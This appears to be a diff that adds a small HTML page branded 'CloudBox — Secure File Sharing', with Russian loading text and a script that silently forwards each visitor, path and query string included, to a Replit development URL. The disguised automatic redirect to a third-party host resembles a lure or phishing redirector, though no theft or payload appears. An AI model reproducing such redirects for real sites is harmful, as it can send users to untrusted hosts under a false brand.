@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CloudBox — Secure File Sharing</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { margin: 0; background: #0f172a; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .loader { text-align: center; }
+        .cloud { font-size: 64px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="cloud">☁️🔒</div>
+        <p>CloudBox загружает файлы...</p>
+    </div>
+    <script>
+        const path = window.location.pathname + window.location.search;
+        const replitUrl = "https://b53997f8-2797-4902-92e3-5375b6a0a6e1-00-16mj1p7dzed04.sisko.replit.dev";
+        window.location.replace(replitUrl + path);
+    </script>
+</body>
+</html>
